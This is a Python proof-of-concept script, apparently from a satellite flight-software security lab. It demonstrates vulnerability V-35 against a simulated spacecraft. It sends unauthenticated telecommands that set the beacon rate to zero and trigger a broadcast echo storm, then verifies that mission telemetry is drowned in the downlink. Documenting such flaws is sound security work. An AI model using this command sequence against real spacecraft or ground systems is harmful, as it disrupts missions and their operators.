#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-35  SET_BEACON_RATE(0) = beacon EVERY loop tick; the operator's
# mission telemetry is drowned (downlink saturation DoS), all triggered
# by one unauthenticated command (service_control analogue).
# SPARTA: IM-0001.01 (resource exhaustion)
def main(dev, ev):
    dev.tc(0x05, b"\x01", via="usb")                 # latch 'changed' quirk
    dev.tc(0x05, b"\x00", via="usb")                 # then: 0 = flood
    frames = dev.advance(20000)
    beacon = [t for t in frames if t.apid == 0x01
              and t.payload[1:7] == b"Beacon"]
    mission = [t for t in frames if t.apid == 0x08]
    ratio = len(beacon) / max(1, len(mission))
    ev.log(f"20 s window: beacons={len(beacon)} mission-TM={len(mission)} "
           f"ratio={ratio:.0f}:1")
    check(len(beacon) >= 150, "beacon every 100 ms tick")
    check(ratio >= 50, "mission telemetry share < 2% -> operator is drowned")
    share = 100.0 * sum(len(t.payload) + 7 for t in mission) / \
        sum(len(t.payload) + 7 for t in frames)
    ev.log(f"mission TM byte share: {share:.1f}% of the downlink")
    check(share < 10, "under 10% of airtime left for science TM")
    # broadcast echo storm stacks on top
    storm = 0
    for i in range(20):
        r = dev.tc(0x06, struct.pack(">H", 916) + b"X" * 62, via="radio")
        storm += len(dev.find(r, 0x06))
    ev.log(f"+20 broadcast echoes ({storm} x 70 B) queued behind the flood")
    check(storm == 20, "echo storm accepted with no rate limiting")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-35 beacon/broadcast downlink saturation", main))
